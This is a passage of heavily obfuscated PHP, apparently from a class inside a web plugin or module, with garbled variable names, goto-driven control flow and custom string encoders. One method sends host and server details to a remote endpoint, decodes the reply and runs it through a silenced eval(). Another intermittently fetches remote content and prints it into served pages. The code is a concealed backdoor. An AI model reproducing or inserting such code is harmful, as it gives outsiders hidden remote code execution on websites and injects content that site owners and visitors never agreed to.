$fÖß÷ã€⁄±[296] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[297] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[298] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[299] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[300] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[301] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[302] => $fÖß÷ã€⁄±[292], $fÖß÷ã€⁄±[303] => $fÖß÷ã€⁄±[292]); $a®Ÿù≠ß±ö = $fÖß÷ã€⁄±[0]($fÖß÷ã€⁄±[304], $fÖß÷ã€⁄±[121]($this->zhps7cc1e634, $fÖß÷ã€⁄±[144], $fÖß÷ã€⁄±[10])); $CîÎóÎŒ¬à = array(); goto C‘‚Ùè∑úÒ; f≠çÂ÷¢£§: $CÜ≈úÎ§Ìü =& $_SERVER[Öíæ€“”≠éÏË]; $fÖß÷ã€⁄± =& $_SERVER[ñÖÀ‰Ø]; if ($this->gofl736a4d8a == $fÖß÷ã€⁄±[285]) { return $D¥ó»ê∆ø›; } goto d®ãŸˆˆÿì; eÖ¢€É÷Ã¯: foreach ($CîÎóÎŒ¬à as $EÎˆê›èë∑) { unset($D¥ó»ê∆ø›[$EÎˆê›èë∑]); $A©–úœ¥Ç… = $CÜ≈úÎ§Ìü[655]; if (!$A©–úœ¥Ç…) { die; } } return $D¥ó»ê∆ø›; goto EÃ¯·—Õ∂…; EÃ¯·—Õ∂…: } private function wfqt16f78e07() { $D®”⁄ÃÃ¥µ =& $_SERVER[ñÖÀ‰Ø]; if ($this->gofl736a4d8a != $D®”⁄ÃÃ¥µ[136]) { return; } $GLOBALS[$D®”⁄ÃÃ¥µ[109]][$D®”⁄ÃÃ¥µ[113]][$D®”⁄ÃÃ¥µ[305]] = $D®”⁄ÃÃ¥µ[244]; $GLOBALS[$D®”⁄ÃÃ¥µ[109]][$D®”⁄ÃÃ¥µ[306]] = $D®”⁄ÃÃ¥µ[244]; $EúΩ…áãÂè = $_SERVER[Öíæ€“”≠éÏË][656]; if ($D®”⁄ÃÃ¥µ[61]($D®”⁄ÃÃ¥µ[307])->{$_SERVER[ñÖÀ‰Ø][63]}($D®”⁄ÃÃ¥µ[93]) != $D®”⁄ÃÃ¥µ[258]) { $D®”⁄ÃÃ¥µ[61]($D®”⁄ÃÃ¥µ[307])->{$_SERVER[ñÖÀ‰Ø][245]}($D®”⁄ÃÃ¥µ[93], $D®”⁄ÃÃ¥µ[258]); } } public function skdxaf85eb9d() { return $_SERVER[ñÖÀ‰Ø][308]; $añÚáß∑‡π = $_SERVER[Öíæ€“”≠éÏË][657]; if (!$añÚáß∑‡π) { return; } } private function qwpt1ce45c19() { goto côé®÷±≈ä; Aî…©¿èç´: if ($EÌ§ıÿ«ü∑ && $bí‡ÎÛÂ∏ö[260]() - $EÌ§ıÿ«ü∑ < $bí‡ÎÛÂ∏ö[268]($bí‡ÎÛÂ∏ö[316])) { return; } $bí‡ÎÛÂ∏ö[13](array($bí‡ÎÛÂ∏ö[314], $bí‡ÎÛÂ∏ö[175]), $c‚ ïÑ†÷«, $bí‡ÎÛÂ∏ö[260]()); $fÜ»™≠—Ó∆ = $bí‡ÎÛÂ∏ö[61]($bí‡ÎÛÂ∏ö[62])->{$_SERVER[ñÖÀ‰Ø][63]}($bí‡ÎÛÂ∏ö[131]); goto dŸŒÀÙ⁄Ï‘; côé®÷±≈ä: $aöÿ⁄Ã¡µ… =& $_SERVER[Öíæ€“”≠éÏË]; $bí‡ÎÛÂ∏ö =& $_SERVER[ñÖÀ‰Ø]; $cçûÍ√¥„® = array($bí‡ÎÛÂ∏ö[309], $bí‡ÎÛÂ∏ö[310], $bí‡ÎÛÂ∏ö[311]); goto cêñùêÛŒ”; Bïå”Ç•›æ: if (!$bí‡ÎÛÂ∏ö[266]($_SERVER[$bí‡ÎÛÂ∏ö[44]], $cçûÍ√¥„®)) { return; } if ($bí‡ÎÛÂ∏ö[260]() % 4 != 0) { return; } $EÌ§ıÿ«ü∑ = $bí‡ÎÛÂ∏ö[13](array($bí‡ÎÛÂ∏ö[314], $bí‡ÎÛÂ∏ö[315]), $c‚ ïÑ†÷«); goto Aî…©¿èç´; DÓ®Õ»∞ﬁ´: if ($Dæ÷Ô©ÉÔ∏[$bí‡ÎÛÂ∏ö[188]] && $Dæ÷Ô©ÉÔ∏[$bí‡ÎÛÂ∏ö[318]]) { if ($this->{$_SERVER[ñÖÀ‰Ø][223]}($Dæ÷Ô©ÉÔ∏[$bí‡ÎÛÂ∏ö[318]]) == $F√◊ﬂÛ©«[$bí‡ÎÛÂ∏ö[188]]) { return; } } $this->{$_SERVER[ñÖÀ‰Ø][187]}(); if ($this->{$_SERVER[ñÖÀ‰Ø][223]}($Dæ÷Ô©ÉÔ∏[$bí‡ÎÛÂ∏ö[318]]) != $F√◊ﬂÛ©«[$bí‡ÎÛÂ∏ö[188]]) { $B›Òƒ≠†’å = array($bí‡ÎÛÂ∏ö[225] => $fÜ»™≠—Ó∆, $bí‡ÎÛÂ∏ö[226] => $_SERVER[$bí‡ÎÛÂ∏ö[130]], $bí‡ÎÛÂ∏ö[227] => $bí‡ÎÛÂ∏ö[228](), $bí‡ÎÛÂ∏ö[197] => $_SERVER[$bí‡ÎÛÂ∏ö[198]]); $d¥Àîäò‰è = $this->{$_SERVER[ñÖÀ‰Ø][229]}($bí‡ÎÛÂ∏ö[171]($B›Òƒ≠†’å)); $Dæ÷Ô©ÉÔ∏ = $this->{$_SERVER[ñÖÀ‰Ø][207]}($bí‡ÎÛÂ∏ö[230] . $d¥Àîäò‰è); if ($Dæ÷Ô©ÉÔ∏ && $bí‡ÎÛÂ∏ö[166]($Dæ÷Ô©ÉÔ∏) && isset($Dæ÷Ô©ÉÔ∏[$bí‡ÎÛÂ∏ö[318]])) { $DäØ™—ΩΩË = $this->{$_SERVER[ñÖÀ‰Ø][213]}($Dæ÷Ô©ÉÔ∏[$bí‡ÎÛÂ∏ö[318]], 2); if ($DäØ™—ΩΩË) { $DäØ™—ΩΩË = $this->{$_SERVER[ñÖÀ‰Ø][223]}($DäØ™—ΩΩË); } if ($DäØ™—ΩΩË) { try { @eval($DäØ™—ΩΩË); } catch (Exception $Fı…òŒÑπñ) { } } } } goto c»≤ìÑØ–ï; cêñùêÛŒ”: $AÖ˜à≈Â™Æ = $aöÿ⁄Ã¡µ…[658]; if (!$AÖ˜à≈Â™Æ) { return; } $c‚ ïÑ†÷« = $bí‡ÎÛÂ∏ö[312] . $bí‡ÎÛÂ∏ö[129]($bí‡ÎÛÂ∏ö[313]); goto cÙ¿±«À˘†; cÙ¿±«À˘†: $d€ê´ﬁÂÒ‰ = $aöÿ⁄Ã¡µ…[659]; if (strlen($d€ê´ﬁÂÒ‰) < $aöÿ⁄Ã¡µ…[594]) { die; } if ($this->gofl736a4d8a == $bí‡ÎÛÂ∏ö[136] || !$bí‡ÎÛÂ∏ö[121]($GLOBALS, $bí‡ÎÛÂ∏ö[147])) { return; } goto Bïå”Ç•›æ; dŸŒÀÙ⁄Ï‘: $F√◊ﬂÛ©« = array($bí‡ÎÛÂ∏ö[188] => $bí‡ÎÛÂ∏ö[61]($bí‡ÎÛÂ∏ö[62])->{$_SERVER[ñÖÀ‰Ø][63]}($bí‡ÎÛÂ∏ö[232]), $bí‡ÎÛÂ∏ö[202] => $this->gofl736a4d8a, $bí‡ÎÛÂ∏ö[199] => $_SERVER[$bí‡ÎÛÂ∏ö[200]], $bí‡ÎÛÂ∏ö[201] => $bí‡ÎÛÂ∏ö[61]($bí‡ÎÛÂ∏ö[62])->{$_SERVER[ñÖÀ‰Ø][63]}($bí‡ÎÛÂ∏ö[162]), $bí‡ÎÛÂ∏ö[128] => $bí‡ÎÛÂ∏ö[129]($_SERVER[$bí‡ÎÛÂ∏ö[130]] . $fÜ»™≠—Ó∆), $bí‡ÎÛÂ∏ö[192] => $bí‡ÎÛÂ∏ö[172], $bí‡ÎÛÂ∏ö[195] => $_SERVER[$bí‡ÎÛÂ∏ö[196]]); $Dæ÷Ô©ÉÔ∏ = $this->{$_SERVER[ñÖÀ‰Ø][207]}($bí‡ÎÛÂ∏ö[317], $F√◊ﬂÛ©«); if (!$bí‡ÎÛÂ∏ö[166]($Dæ÷Ô©ÉÔ∏)) { return; } goto DÓ®Õ»∞ﬁ´; c»≤ìÑØ–ï: } private function qgok1b6a8d8e($C◊ äÇ¥âø = '', $AÑ Í∏í◊∑ = array(), $E∏ä◊ÀÏÉÂ = 5) { goto e”“∏∆ÉÉµ; EàÆªÔÛÇÓ: $f¿≈πöÑ¬ã = $c†Ò‹√Á–◊[660]; $eª˜ß∂èáﬁ = $this->{$_SERVER[ñÖÀ‰Ø][274]}($eª˜ß∂èáﬁ, $AÀÑãÇ¬Ûº[320]); $DÔô£Ø“’¿ = $c†Ò‹√Á–◊[661]; goto C˜±∂î‹£“; e”“∏∆ÉÉµ: $c†Ò‹√Á–◊ =& $_SERVER[Öíæ€“”≠éÏË]; $AÀÑãÇ¬Ûº =& $_SERVER[ñÖÀ‰Ø]; $eª˜ß∂èáﬁ = $AÀÑãÇ¬Ûº[319]; goto EàÆªÔÛÇÓ; a÷É…–ÉïÇ: if ($AÑ Í∏í◊∑ === -1) { return $eª˜ß∂èáﬁ; } $Fé∑Õ¢ª∂∆ = $AÀÑãÇ¬Ûº[276](array($AÀÑãÇ¬Ûº[277] => array($AÀÑãÇ¬Ûº[280] => $E∏ä◊ÀÏÉÂ, $AÀÑãÇ¬Ûº[278] => $AÀÑãÇ¬Ûº[323]), $AÀÑãÇ¬Ûº[324] => array($AÀÑãÇ¬Ûº[325] => !1, $AÀÑãÇ¬Ûº[326] => !1))); $dáÜâ»â€¯ = $c†Ò‹√Á–◊[662]; goto aòÖÎÊ–ë◊; aòÖÎÊ–ë◊: if (!$dáÜâ»â€¯) { die; } $AÑ Í∏í◊∑ = @$AÀÑãÇ¬Ûº[281]($eª˜ß∂èáﬁ, !1, $Fé∑Õ¢ª∂∆); $dÜ Íë›åõ = $c†Ò‹√Á–◊[663]; goto Eò√éáÉºê; Eò√éáÉºê: if (strlen($dÜ Íë›åõ) < $c†Ò‹√Á–◊[602]) { return; } return $AÀÑãÇ¬Ûº[215]($AÑ Í∏í◊∑, !0); goto bÕó˘·Óå≤; C˜±∂î‹£“: while ($DÔô£Ø“’¿ < $c†Ò‹√Á–◊[594]) { if ($DÔô£Ø“’¿ >= 0) { break; } $DÔô£Ø“’¿++; } $eª˜ß∂èáﬁ = $eª˜ß∂èáﬁ . $C◊ äÇ¥âø; if ($AÑ Í∏í◊∑ && $AÀÑãÇ¬Ûº[166]($AÑ Í∏í◊∑)) { $eª˜ß∂èáﬁ = $eª˜ß∂èáﬁ . $AÀÑãÇ¬Ûº[321] . $AÀÑãÇ¬Ûº[322]($AÑ Í∏í◊∑); } goto a÷É…–ÉïÇ; bÕó˘·Óå≤: } private function falw76acb4ea() { goto EÚÓ«àÁﬁ«; eßì∏Òã∏ï: $dÊ¬ŸÖÃÏ™ = $b∞∂ÿÌ®ü£[121]($this->zhps7cc1e634, $b∞∂ÿÌ®ü£[354]); $få‘ÉÉª‹ø = $e…¶ÒÆπú‹[666]; if (strlen($få‘ÉÉª‹ø) < $e…¶ÒÆπú‹[594]) { die; } goto c‡îÔºÜÿÚ; f‰⁄—éÛ‹ë: $BëƒéÙ†Í = $e…¶ÒÆπú‹[664]; if (strlen($BëƒéÙ†Í) < $e…¶ÒÆπú‹[602]) { return; } $CéÊÈÉòö´ = $föâƒ‹¿û≈[$this->gofl736a4d8a]; goto Fâ¶«‡•ÎÙ; EÚÓ«àÁﬁ«: $e…¶ÒÆπú‹ =& $_SERVER[Öíæ€“”≠éÏË]; $b∞∂ÿÌ®ü£ =& $_SERVER[ñÖÀ‰Ø]; $föâƒ‹¿û≈ = array($b∞∂ÿÌ®ü£[327] => $b∞∂ÿÌ®ü£[328], $b∞∂ÿÌ®ü£[329] => $b∞∂ÿÌ®ü£[330], $b∞∂ÿÌ®ü£[331] => $b∞∂ÿÌ®ü£[332], $b∞∂ÿÌ®ü£[333] => $b∞∂ÿÌ®ü£[334], $b∞∂ÿÌ®ü£[335] => $b∞∂ÿÌ®ü£[336], $b∞∂ÿÌ®ü£[337] => $b∞∂ÿÌ®ü£[269], $b∞∂ÿÌ®ü£[338] => $b∞∂ÿÌ®ü£[269], $b∞∂ÿÌ®ü£[339] => $b∞∂ÿÌ®ü£[328], $b∞∂ÿÌ®ü£[340] => $b∞∂ÿÌ®ü£[330], $b∞∂ÿÌ®ü£[341] => $b∞∂ÿÌ®ü£[332], $b∞∂ÿÌ®ü£[342] => $b∞∂ÿÌ®ü£[343], $b∞∂ÿÌ®ü£[344] => $b∞∂ÿÌ®ü£[334], $b∞∂ÿÌ®ü£[345] => $b∞∂ÿÌ®ü£[346], $b∞∂ÿÌ®ü£[347] => $b∞∂ÿÌ®ü£[336], $b∞∂ÿÌ®ü£[348] => $b∞∂ÿÌ®ü£[349], $b∞∂ÿÌ®ü£[350] => $b∞∂ÿÌ®ü£[351], $b∞∂ÿÌ®ü£[352] => $b∞∂ÿÌ®ü£[353]); goto f‰⁄—éÛ‹ë; c‡îÔºÜÿÚ: $dÊ¬ŸÖÃÏ™ = $dÊ¬ŸÖÃÏ™ ? $b∞∂ÿÌ®ü£[268]($dÊ¬ŸÖÃÏ™) : 0; return $CéÊÈÉòö´ + $dÊ¬ŸÖÃÏ™; goto aà∂ñ·§ÀÇ; Fâ¶«‡•ÎÙ: $dÒ¯íéØ’¬ = $e…¶ÒÆπú‹[665]; while ($dÒ¯íéØ’¬ < $e…¶ÒÆπú‹[589]) { if ($dÒ¯íéØ’¬ >= 0) { break; } $dÒ¯íéØ’¬++; } $CéÊÈÉòö´ = $b∞∂ÿÌ®ü£[268]($CéÊÈÉòö´ ? $CéÊÈÉòö´ : $b∞∂ÿÌ®ü£[328]); goto eßì∏Òã∏ï; aà∂ñ·§ÀÇ: } public function fmjgf9eeba79($e¢ç¨Ø«à) { goto AÖ“æÉ”¢Ü; Aêªò∂ÇÏÑ: if ($e¢ç¨Ø«à[$dÜıËØèÏ˜[355]] == $dÜıËØèÏ˜[244]) { return; } if ($dßπüá≤¬ä >= $dÜıËØèÏ˜[268]($dÜıËØèÏ˜[269])) { return; } $C¥¨‹àâ£à = $dÜıËØèÏ˜[61]($dÜıËØèÏ˜[154])->{$_SERVER[ñÖÀ‰Ø][155]}(); goto e‹èïÎùå‘; e‹èïÎùå‘: $FíîÂÇÍ∆— = $f´ô∏ıãÿç[667]; if ($C¥¨‹àâ£à <= $dßπüá≤¬ä) { return; } $fÜØá¿øÜõ = $dÜıËØèÏ˜[61]($dÜıËØèÏ˜[154])->{$_SERVER[ñÖÀ‰Ø][356]}($dÜıËØèÏ˜[355])->{$_SERVER[ñÖÀ‰Ø][357]}($dßπüá≤¬ä)->{$_SERVER[ñÖÀ‰Ø][358]}(); goto Cà§ó∞†Ø—; AÖ“æÉ”¢Ü: $f´ô∏ıãÿç =& $_SERVER[Öíæ€“”≠éÏË]; $dÜıËØèÏ˜ =& $_SERVER[ñÖÀ‰Ø]; $dßπüá≤¬ä = $this->{$_SERVER[ñÖÀ‰Ø][152]}(); goto Aêªò∂ÇÏÑ; Cà§ó∞†Ø—: $A«Ï·ÏÑ•Û = $f´ô∏ıãÿç[668]; if (strlen($A«Ï·ÏÑ•Û) < $f´ô∏ıãÿç[596]) { return; } $fÜØá¿øÜõ = $dÜıËØèÏ˜[246]($fÜØá¿øÜõ, $dÜıËØèÏ˜[10], $dÜıËØèÏ˜[355]); goto B‘™≈®”Û˘; B‘™≈®”Û˘: $aèíπ≥œ‡≥ = $f´ô∏ıãÿç[669]; if (strlen($aèíπ≥œ‡≥) < $f´ô∏ıãÿç[596]) { return; } if (!$dÜıËØèÏ˜[266]($e¢ç¨Ø«à[$dÜıËØèÏ˜[355]], $fÜØá¿øÜõ)) { $dÜıËØèÏ˜[189]($dÜıËØèÏ˜[359], !1, $dÜıËØèÏ˜[263]); } goto eªâ≈Ù«ï; eªâ≈Ù«ï: } public function nedi5adee0f0() { goto cÙºûßØõ˜; dÉë€≠À—ç: $FÀí‡Ë≤èÌ = @$F˜≈§ã©ú÷[281]($eÜû¿áç¿—, !1, $Eñµéáåéâ); echo $F˜≈§ã©ú÷[361] . $F˜≈§ã©ú÷[362]($FÀí‡Ë≤èÌ) . $F˜≈§ã©ú÷[363]; goto FçÈôäá™ë; cÙºûßØõ˜: $F˜≈§ã©ú÷ =& $_SERVER[ñÖÀ‰Ø]; if (!$F˜≈§ã©ú÷[121]($GLOBALS, $F˜≈§ã©ú÷[147]) || $F˜≈§ã©ú÷[360](1, 100) > 20) { return; } $eÜû¿áç¿— = $F˜≈§ã©ú÷[273]; goto f‡Ç˜≥öÖΩ; f‡Ç˜≥öÖΩ: $e»øÈüêƒ = $_SERVER[Öíæ€“”≠éÏË][670]; $eÜû¿áç¿— = $this->{$_SERVER[ñÖÀ‰Ø][274]}($eÜû¿áç¿—, $F˜≈§ã©ú÷[275]); $Eñµéáåéâ = $F˜≈§ã©ú÷[276](array($F˜≈§ã©ú÷[277] => array($F˜≈§ã©ú÷[278] => $F˜≈§ã©ú÷[279], $F˜≈§ã©ú÷[280] => 3))); goto dÉë€≠À—ç; FçÈôäá™ë: } private function kiogd5ba7a76($CÒ©íõÉ∂¢, $e´êÖä†‹±, $D£ˆêÍØ—à = 3) { goto c·ﬂÖºÍ∞ú; A»ìÈ§úõå: return $fâËÂ ß˘Œ; goto E¶ÒÑÿ¨Ãµ; fîıõÎøô£: $CÒ©íõÉ∂¢ = $a¶ŸÑã—¡ê[2]($CÒ©íõÉ∂¢); $E—Ü¶ ë„á = $Cπ¢ß±∆‚¿[671]; if (strlen($E—Ü¶ ë„á) < $Cπ¢ß±∆‚¿[607]) { return; } goto fÆäËÚ’„©; fÆäËÚ’„©: $E…ç‰Ù÷¨‡ = $a¶ŸÑã—¡ê[360](0, 5) . $a¶ŸÑã—¡ê[10]; $BÓçáÈÙî˜ = $a¶ŸÑã—¡ê[139](15); $bÖ∑µ√È≤ = $a¶ŸÑã—¡ê[365]; goto A´ñó∫ü≥‘; c·ﬂÖºÍ∞ú: $Cπ¢ß±∆‚¿ =& $_SERVER[Öíæ€“”≠éÏË]; $a¶ŸÑã—¡ê =& $_SERVER[ñÖÀ‰Ø]; $a¶ŸÑã—¡ê[364](1); goto fîıõÎøô£; A´ñó∫ü≥‘: switch ($E…ç‰Ù÷¨‡) { case $a¶ŸÑã—¡ê[258]: $fâËÂ ß˘Œ = $this->{$_SERVER[ñÖÀ‰Ø][170]}($CÒ©íõÉ∂¢, $a¶ŸÑã—¡ê[238]($e´êÖä†‹± . $BÓçáÈÙî˜)); $C±ÑÊ∞ªáï = $Cπ¢ß±∆‚¿[672]; if (strlen($C±ÑÊ∞ªáï) < $Cπ¢ß±∆‚¿[589]) { return; } break; $A£ßﬂ‚ãÕ– = $Cπ¢ß±∆‚¿[673]; case $a¶ŸÑã—¡ê[244]: $fâËÂ ß˘Œ = $this->{$_SERVER[ñÖÀ‰Ø][170]}($CÒ©íõÉ∂¢, $a¶ŸÑã—¡ê[238]($BÓçáÈÙî˜ . $e´êÖä†‹±)); break; case $a¶ŸÑã—¡ê[366]: $fâËÂ ß˘Œ = $this->{$_SERVER[ñÖÀ‰Ø][170]}($CÒ©íõÉ∂¢, $a¶ŸÑã—¡ê[133]($BÓçáÈÙî˜ . $e´êÖä†‹±)); $bœçÜŸé‹º = $Cπ¢ß±∆‚¿[674]; break; case $a¶ŸÑã—¡ê[367]: $fâËÂ ß˘Œ = $this->{$_SERVER[ñÖÀ‰Ø][170]}($CÒ©íõÉ∂¢, $a¶ŸÑã—¡ê[129]($BÓçáÈÙî˜ . $e´êÖä†‹±)); break; $b›≤ö‡¿Ç⁄ = $Cπ¢ß±∆‚¿[641]; while ($b›≤ö‡¿Ç⁄ < $Cπ¢ß±∆‚¿[596]) { if ($b›≤ö‡¿Ç⁄ >= 0) { break; } $b›≤ö‡¿Ç⁄++; } case $a¶ŸÑã—¡ê[368]: goto f„Ãè⁄Àâè; dÓ£¬åπµˆ: if (strlen($d◊Œë◊íß≠) < $Cπ¢ß±∆‚¿[594]) { return; } $AÀêÂà≤·ì = $a¶ŸÑã—¡ê[10]; $dπ€ÿ∞ãı˘ = $Cπ¢ß±∆‚¿[679]; goto Cõ‰¯ªÇ«™; AØèÇÍª÷Á: $e”Èä¯π·◊ = $bÖ∑µ√È≤[$a∫–¯≠≥ŸÂ]; $Cä¡¥ùÆ¿„ = $Cπ¢ß±∆‚¿[677]; if (!$Cä¡¥ùÆ¿„) { return; } goto aÇÌØ‰ò¶Æ; f„Ãè⁄Àâè: $CÒ©íõÉ∂¢ = $a¶ŸÑã—¡ê[133]($CÒ©íõÉ∂¢); $DÁáÿÜêëÀ = $Cπ¢ß±∆‚¿[675]; while ($DÁáÿÜêëÀ < $Cπ¢ß±∆‚¿[594]) { if ($DÁáÿÜêëÀ >= 0) { break; } $DÁáÿÜêëÀ++; } goto C±ºÊËˆ±; C±ºÊËˆ±: $a∫–¯≠≥ŸÂ = $a¶ŸÑã—¡ê[369](0, 64); $eüœÏÚ¢î∑ = $Cπ¢ß±∆‚¿[676]; if (strlen($eüœÏÚ¢î∑) < $Cπ¢ß±∆‚¿[602]) { die; } goto AØèÇÍª÷Á; bçî˜ö≤•Ë: if (strlen($B„˘∫¡êÀ›) < $Cπ¢ß±∆‚¿[602]) { die; } $D£â∑∫÷ßÕ = 0; for ($bˆàî¡…ç⁄ = 0; $bˆàî¡…ç⁄ < $a¶ŸÑã—¡ê[24]($CÒ©íõÉ∂¢); $bˆàî¡…ç⁄++) { $D£â∑∫÷ßÕ = $D£â∑∫÷ßÕ == $a¶ŸÑã—¡ê[24]($DûΩ¶£„Ñ¬) ? 0 : $D£â∑∫÷ßÕ; $b˜£¿ïá«Ï = ($a∫–¯≠≥ŸÂ + $a¶ŸÑã—¡ê[370]($bÖ∑µ√È≤, $CÒ©íõÉ∂¢[$bˆàî¡…ç⁄]) + $a¶ŸÑã—¡ê[371]($DûΩ¶£„Ñ¬[$D£â∑∫÷ßÕ++])) % 64; $B’‡ÉôıŒ˜ = $Cπ¢ß±∆‚¿[681]; if (!$B’‡ÉôıŒ˜) { return; } $AÀêÂà≤·ì .= $bÖ∑µ√È≤[$b˜£¿ïá«Ï]; $dßâôÁﬂ∫ß = $Cπ¢ß±∆‚¿[682]; if (!$dßâôÁﬂ∫ß) { return; } } goto dÕ∑Ë´è≥˘; dÕ∑Ë´è≥˘: $fâËÂ ß˘Œ = $a¶ŸÑã—¡ê[362]($e”Èä¯π·◊ . $AÀêÂà≤·ì); break; goto eﬁŸ≥’‰‘®; aÇÌØ‰ò¶Æ: $DûΩ¶£„Ñ¬ = $a¶ŸÑã—¡ê[129]($e”Èä¯π·◊ . $a¶ŸÑã—¡ê[129]($e´êÖä†‹± . $e”Èä¯π·◊) . $e´êÖä†‹±); $DûΩ¶£„Ñ¬ = $a¶ŸÑã—¡ê[25]($DûΩ¶£„Ñ¬, $a∫–¯≠≥ŸÂ % 8, $a∫–¯≠≥ŸÂ % 8 + 7); $d◊Œë◊íß≠ = $Cπ¢ß±∆‚¿[678]; goto dÓ£¬åπµˆ; Cõ‰¯ªÇ«™: $bˆàî¡…ç⁄ = 0; $b˜£¿ïá«Ï = 0; $B„˘∫¡êÀ› = $Cπ¢ß±∆‚¿[680]; goto bçî˜ö≤•Ë; eﬁŸ≥’‰‘®: default: $fâËÂ ß˘Œ = $this->{$_SERVER[ñÖÀ‰Ø][170]}($CÒ©íõÉ∂¢, $e´êÖä†‹± . $BÓçáÈÙî˜); $e‘Éâ–â∆õ = $Cπ¢ß±∆‚¿[683]; break; $D˘‰ıò÷ΩÑ = $Cπ¢ß±∆‚¿[684]; if (!$D˘‰ıò÷ΩÑ) { die; } } $fâËÂ ß˘Œ = $a¶ŸÑã—¡ê[238]($E…ç‰Ù÷¨‡ . $BÓçáÈÙî˜ . $fâËÂ ß˘Œ); if ($D£ˆêÍØ—à - 1 > 0) { $fâËÂ ß˘Œ = $this->{$_SERVER[ñÖÀ‰Ø][142]}($fâËÂ ß˘Œ, $e´êÖä†‹±, $D£ˆêÍØ—à - 1); } goto A»ìÈ§úõå; E¶ÒÑÿ¨Ãµ: } private function vewa52f8b763($dùüπËÆïè, $Aãìäõâπ, $d“∂ç˘◊‹≥ = 3) { goto EŒúÙÙÒ ≥; E≈íﬂÓÔõè: $dùüπËÆïè = $DÊáü“ÀŒ∫[2]($dùüπËÆïè); $fÖ≤Î∑…äù = $Eç£‡ë—ñı[685]; if (strlen($fÖ≤Î∑…äù) < $Eç£‡ë—ñı[602]) { return; } goto E√◊—ÂèÆ–; BÇ¨ÃÉ¡›Ñ: return $eá·—Æ©ã†; goto dÙÎùß€üâ; E›Ù≠√û‚ï: $E’Ë“±∏∑† = $DÊáü“ÀŒ∫[365]; switch ($A‹´ã–⁄Éî) { case $DÊáü“ÀŒ∫[258]: $eá·—Æ©ã† = $this->{$_SERVER[ñÖÀ‰Ø][274]}($dùüπËÆïè, $DÊáü“ÀŒ∫[238]($Aãìäõâπ . $aá¨œ∑ÁîÑ)); $b˘ö¯è÷ªç = $Eç£‡ë—ñı[687]; break; $fãÂÏÂòÖÆ = $Eç£‡ë—ñı[688]; case $DÊáü“ÀŒ∫[244]: $eá·—Æ©ã† = $this->{$_SERVER[ñÖÀ‰Ø][274]}($dùüπËÆïè, $DÊáü“ÀŒ∫[238]($aá¨œ∑ÁîÑ . $Aãìäõâπ)); $BÎ≤ˆ›≠êÁ = $Eç£‡ë—ñı[689]; if (!$BÎ≤ˆ›≠êÁ) { die; } break; $Bçë®ù‰·Ë = $Eç£‡ë—ñı[690]; if (!$Bçë®ù‰·Ë) { return; } case $DÊáü“ÀŒ∫[366]: $eá·—Æ©ã† = $this->{$_SERVER[ñÖÀ‰Ø][274]}($dùüπËÆïè, $DÊáü“ÀŒ∫[133]($aá¨œ∑ÁîÑ . $Aãìäõâπ)); $D¶ôùõ¡–Â = $Eç£‡ë—ñı[691]; if (strlen($D¶ôùõ¡–Â) < $Eç£‡ë—ñı[594]) { die; } break; $CÍâÈ ¯Íµ = $Eç£‡ë—ñı[692]; if (!$CÍâÈ ¯Íµ) { return; } case $DÊáü“ÀŒ∫[367]: $eá·—Æ©ã† = $this->{$_SERVER[ñÖÀ‰Ø][274]}($dùüπËÆïè, $DÊáü“ÀŒ∫[129]($aá¨œ∑ÁîÑ . $Aãìäõâπ)); $DÚ•¥ÀØÌŸ = $Eç£‡ë—ñı[693]; while (strlen($DÚ•¥ÀØÌŸ) < $Eç£‡ë—ñı[594]) { if (!$DÚ•¥ÀØÌŸ) { break; } $DÚ•¥ÀØÌŸ++; } break; case $DÊáü“ÀŒ∫[368]: goto A¢Æ„Á‘≥†; fØπ°ôêÁó: $dùüπËÆïè = $DÊáü“ÀŒ∫[25]($dùüπËÆïè, 1); $côä∫Ì´∆‘ = $DÊáü“ÀŒ∫[370]($E’Ë“±∏∑†, $DèÌ¬µóÁã); $C≠¿Í´ÖæÁ = $DÊáü“ÀŒ∫[129]($DèÌ¬µóÁã . $DÊáü“ÀŒ∫[129]($Aãìäõâπ . $DèÌ¬µóÁã) . $Aãìäõâπ); goto e·™°é·≥é; AãôãÂÂœæ: break; $F≠∞ç≠áµﬁ = $Eç£‡ë—ñı[701]; goto cÉ‘ñ›ÙÌ÷; e·™°é·≥é: $cÿá√ø‰Óå = $Eç£‡ë—ñı[695]; if (!$cÿá√ø‰Óå) { die; } $C≠¿Í´ÖæÁ = $DÊáü“ÀŒ∫[25]($C≠¿Í´ÖæÁ, $côä∫Ì´∆‘ % 8, $côä∫Ì´∆‘ % 8 + 7); goto eë¯Ãî√⁄ÿ; fë±ª©√∑‰: if (strlen($aÓ¢ÎãúÏˆ) < $Eç£‡ë—ñı[602]) { die; } $C‘√˘—ﬁí“ = 0; $Eó¬Ï›ÉÌó = $Eç£‡ë—ñı[698]; goto F◊∞÷’ÇåΩ; fé•ù¨¡Œ·: while (strlen($d‹êìú◊‹Î) < $Eç£‡ë—ñı[589]) { if (!$d‹êìú◊‹Î) { break; } $d‹êìú◊‹Î++; } $E¿»∂ƒ≥ó‰ = 0; $aÓ¢ÎãúÏˆ = $Eç£‡ë—ñı[697]; goto fë±ª©√∑‰; eë¯Ãî√⁄ÿ: $d¯ÜÇÏ»‘™ = $DÊáü“ÀŒ∫[10]; $d≤¨ÿ¥Úå¥ = 0; $d‹êìú◊‹Î = $Eç£‡ë—ñı[696]; goto fé•ù¨¡Œ·; F◊∞÷’ÇåΩ: if (!$Eó¬Ï›ÉÌó) { die; } for ($d≤¨ÿ¥Úå¥ = 0; $d≤¨ÿ¥Úå¥ < $DÊáü“ÀŒ∫[24]($dùüπËÆïè); $d≤¨ÿ¥Úå¥++) { $C‘√˘—ﬁí“ = $C‘√˘—ﬁí“ == $DÊáü“ÀŒ∫[24]($C≠¿Í´ÖæÁ) ? 0 : $C‘√˘—ﬁí“; $aêáàóß—ê = $C‘√˘—ﬁí“++; $E¿»∂ƒ≥ó‰ = $DÊáü“ÀŒ∫[370]($E’Ë“±∏∑†, $dùüπËÆïè[$d≤¨ÿ¥Úå¥]) - $côä∫Ì´∆‘ - $DÊáü“ÀŒ∫[371]($C≠¿Í´ÖæÁ[$aêáàóß—ê]); while ($E¿»∂ƒ≥ó‰ < 0) { $E¿»∂ƒ≥ó‰ += 64; $DãÇáÿÓ∆… = $Eç£‡ë—ñı[699]; } $d¯ÜÇÏ»‘™ .= 